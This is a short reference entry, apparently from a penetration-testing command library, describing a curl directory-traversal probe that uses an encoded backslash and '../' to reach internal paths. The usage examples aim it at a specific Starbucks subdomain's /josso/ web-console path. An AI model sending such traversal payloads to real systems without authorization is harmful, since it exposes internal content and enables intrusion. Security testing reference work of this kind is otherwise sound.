---
data: 'curl -i "http://target/path/%5C../"'
tags:
  - exploit
  - traversal
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 07547d89-11f1-429a-9ab0-20c1857bd2d8
created_at: '2025-12-11T06:10:24.820Z'
updated_at: '2025-12-11T06:10:24.820Z'
verified: false
validated: true
submitted: true
---
# curl-directory-traversal

## Command

```bash
curl -i "http://target/path/%5C../"
```

## Description

Uses curl to attempt directory traversal by appending special characters to URLs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers | Yes |
| `url` | Target URL with traversal pattern | Yes |

## Examples

### Basic Usage

```bash
curl -i "http://subdomain.starbucks.com/josso/%5C../"
```

### Advanced Usage

```bash
curl -i "http://subdomain.starbucks.com/josso/%5C../web-console"
```

## Expected Output

Response from traversed path, potentially internal content.

## Related

- [[commands/curl-path-manipulation]]
- [[procedures/Exploit-Directory-Traversal-in-Tomcat-mod_proxy]]
